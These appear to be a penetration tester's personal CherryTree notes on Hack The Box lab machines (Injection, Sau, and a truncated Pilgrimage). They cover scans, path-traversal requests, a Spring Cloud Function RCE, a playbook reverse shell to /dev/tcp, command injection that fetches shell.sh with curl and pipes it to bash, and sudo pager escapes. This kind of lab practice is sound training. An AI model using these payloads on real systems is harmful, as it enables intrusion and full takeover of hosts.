<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="HTB" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675434884" ts_lastsave="1689073807">
    <node name="Easypass" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435533" ts_lastsave="1675435537">
      <node name="Ghidra" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435542" ts_lastsave="1675435544">
        <rich_text>Open file in Ghidra
</rich_text>
      </node>
    </node>
    <node name="Injection" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073807" ts_lastsave="1689158249">
      <rich_text>10.129.145.167</rich_text>
      <node name="nmap" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073815" ts_lastsave="1689074521">
        <rich_text># Nmap 7.94 scan initiated Tue Jul 11 07:11:04 2023 as: nmap -p- -sC -sV -oA nmap/injection 10.129.145.167
Nmap scan report for 10.129.145.167
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Tue Jul 11 07:11:28 2023 -- 1 IP address (1 host up) scanned in 24.42 seconds</rich_text>
      </node>
      <node name="buster" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689074403" ts_lastsave="1689074564">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      112l      326w     5371c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/blogs">http://10.129.145.167:8080/blogs</rich_text>
        <rich_text>
200      GET      104l      194w     5654c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/register">http://10.129.145.167:8080/register</rich_text>
        <rich_text>
200      GET       26l       48w      457c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/test.css">http://10.129.145.167:8080/css/test.css</rich_text>
        <rich_text>
200      GET       54l      107w     1857c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/upload">http://10.129.145.167:8080/upload</rich_text>
        <rich_text>
200      GET       22l       22w      262c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/under.css">http://10.129.145.167:8080/css/under.css</rich_text>
        <rich_text>
500      GET        1l        3w      106c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/error">http://10.129.145.167:8080/error</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      166l      487w     6657c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
200      GET      155l      278w     3093c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/blog.css">http://10.129.145.167:8080/css/blog.css</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css</rich_text>
        <rich_text>
500      GET        1l       27w      712c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/environment">http://10.129.145.167:8080/environment</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/plain]">http://10.129.145.167:8080/plain]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[">http://10.129.145.167:8080/[</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/]">http://10.129.145.167:8080/]</rich_text>
        <rich_text>
[############&gt;-------] - 72s    18400/30019   0s      found:14      errors:0      
[############&gt;-------] - 72s    18373/30000   253/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                     400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/quote]">http://10.129.145.167:8080/quote]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/extension]">http://10.129.145.167:8080/extension]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[0-9]">http://10.129.145.167:8080/[0-9]</rich_text>
        <rich_text>
[####################] - 2m     30019/30019   0s      found:17      errors:0      
[####################] - 2m     30000/30000   258/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                                                                                                           
</rich_text>
      </node>
      <node name="LFI" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077445" ts_lastsave="1689077639">
        <rich_text>in burpsuite

GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Tue, 11 Jul 2023 12:03:39 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
</rich_text>
      </node>
      <node name="LFI2" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077639" ts_lastsave="1689078228">
        <rich_text>GET /show_image?img=../ HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Tue, 11 Jul 2023 12:13:33 GMT
Connection: close

java
resources
uploads
</rich_text>
      </node>
      <node name="LFI3" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078228" ts_lastsave="1689078287">
        <rich_text>GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Tue, 11 Jul 2023 12:23:36 GMT
Connection: close

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
	xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
	&lt;parent&gt;
		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
		&lt;version&gt;2.6.5&lt;/version&gt;
		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
	&lt;/parent&gt;
	&lt;groupId&gt;com.example&lt;/groupId&gt;
	&lt;artifactId&gt;WebApp&lt;/artifactId&gt;
	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
	&lt;name&gt;WebApp&lt;/name&gt;
	&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
	&lt;properties&gt;
		&lt;java.version&gt;11&lt;/java.version&gt;
	&lt;/properties&gt;
	&lt;dependencies&gt;
		&lt;dependency&gt;
  			&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;
  			&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;
  			&lt;version&gt;1.2.0&lt;/version&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
			&lt;scope&gt;runtime&lt;/scope&gt;
			&lt;optional&gt;true&lt;/optional&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
			&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
			&lt;version&gt;3.2.2&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
			&lt;scope&gt;test&lt;/scope&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
			&lt;version&gt;5.1.3&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
		&lt;/dependency&gt;

	&lt;/dependencies&gt;
	&lt;build&gt;
		&lt;plugins&gt;
			&lt;plugin&gt;
				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
				&lt;version&gt;${parent.version}&lt;/version&gt;
			&lt;/plugin&gt;
		&lt;/plugins&gt;
		&lt;finalName&gt;spring-webapp&lt;/finalName&gt;
	&lt;/build&gt;

&lt;/project&gt;
</rich_text>
      </node>
      <node name="exploit" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078287" ts_lastsave="1689080353">
        <rich_text>spring-cloud-function-web 3.2.2 exploit

</rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE</rich_text>
        <rich_text>

git clone </rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git</rich_text>
        <rich_text>

python3 spring-cloud-rce.py


nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 41128
/bin/sh: 0: can't access tty; job control turned off
$ whoami
frank
$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
$


frank@inject:~/.m2$ cat settings.xml 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
        xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;



frank@inject:~$ su phil
Password: 
phil@inject:/home/frank$ whoami
phil
phil@inject:/home/frank$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/home/frank$


phil@inject:/home/frank$ cd
phil@inject:~$ cat user.txt 
26d42bbfbdbf8ef18ed865c4ce22dee7


run linpeas.sh


phil@inject:/opt/automation/tasks$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

      
create a playbook

phil@inject:/opt/automation/tasks$ cat playbook_2.yml 
- hosts: localhost
  tasks: [shell: /bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.16.5/444 0&gt;&amp;1 ’]
  
  
wait for callback

      
nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 57464
bash: cannot set terminal process group (26957): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks# 

root@inject:/opt/automation/tasks# id
id
uid=0(root) gid=0(root) groups=0(root)

root@inject:~# pwd
pwd
/root
root@inject:~# ls
ls
playbook_1.yml
root.txt
root@inject:~# cat roo	
cat root.txt 
f844e8f584e0af0e6fa67d8261e12929
root@inject:~#</rich_text>
      </node>
    </node>
    <node name="Sau" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158249" ts_lastsave="1689322762">
      <node name="nmap" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158254" ts_lastsave="1689171373">
        <rich_text># Nmap 7.94 scan initiated Wed Jul 12 06:34:51 2023 as: nmap -p- -sC -sV -oA nmap/all 10.129.144.245
Nmap scan report for 10.129.144.245
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 12 Jul 2023 10:35:51 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|     Content-Length: 27
|     href="/web"&gt;Found&lt;/a&gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Wed Jul 12 06:36:49 2023 -- 1 IP address (1 host up) scanned in 117.97 seconds</rich_text>
      </node>
      <node name="web" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171373" ts_lastsave="1689171416">
        <rich_text link="webs http://10.129.144.245:55555/web">http://10.129.144.245:55555/web</rich_text>
      </node>
      <node name="buster" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171416" ts_lastsave="1689171488">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>        

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/Stats">http://10.129.144.245:55555/api/Stats</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
        <rich_text>
301      GET        2l        3w       47c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/VERSION">http://10.129.144.245:55555/api/VERSION</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
200      GET        1l        1w      140c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/STATS">http://10.129.144.245:55555/api/STATS</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
      </node>
      <node name="requests-basket" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171488" ts_lastsave="1689171545">
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
name	"request-baskets"
version	"1.2.1"
commit	"n/a"
commit_short	"n/a"
source_code	"</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets">https://github.com/darklynx/request-baskets</rich_text>
        <rich_text>"

</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets/">request-baskets</rich_text>
        <rich_text> 1.2.1  exploit
</rich_text>
      </node>
      <node name="exploit" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171545" ts_lastsave="1689171835">
        <rich_text link="webs https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://notes.sjtu.edu.cn/s/MUUhEymt7">https://notes.sjtu.edu.cn/s/MUUhEymt7</rich_text>
        <rich_text>


create burp request

proxy response = true

POST /api/baskets/testHTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}


see Maltrail v0.53 exploit


</rich_text>
        <rich_text link="webs https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</rich_text>
        <rich_text>


create another burp request

proxy response = true
login

POST /api/baskets/test2 HTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/login</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}



serve reverse shell.sh
python3 -m http.server 80


curl 'http://10.129.144.245:55555/test2' \   
  --data 'username=;`curl http://10.10.14.42/shell.sh | bash`'
  
  
  
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.144.245] 46882
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$
puma@sau:~$ cat user.txt 
cat user.txt
c8958b3fceab6081a92de715b1440bd3



puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
    
    
    
sudo /usr/bin/systemctl status trail.service
!sh

cat root.txt</rich_text>
      </node>
    </node>
    <node name="Pilgrimage" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322762" ts_lastsave="1689322925">
      <rich_text>10.129.142.239</rich_text>
      <node name="nmap" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322767" ts_lastsave="1689323176">
        <rich_text>sudo nmap -p- -sC -sV 10.129.142.239 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-07-14 04:22 EDT
Nmap scan report for 10.129.142.239
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to </rich_text>
